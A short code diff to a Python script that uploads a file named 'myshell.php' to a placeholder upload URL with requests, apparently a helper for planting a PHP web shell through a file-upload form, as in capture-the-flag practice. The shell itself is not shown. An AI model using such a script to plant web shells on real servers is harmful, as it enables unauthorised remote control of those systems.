@@ -3,7 +3,7 @@ import requests
 url="http://example.com/upload" #insert link here
 
 #headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary5tBS5SLzak42PAxi'}
-path_to_shell=""
+path_to_shell="/home/elliot/Desktop/myshell.php" #replace this with the path
 with open(path_to_shell,'rb') as f:
     files={'file':f} #check the params first and confirm that this is alright.
     r=requests.post(url, files=files)
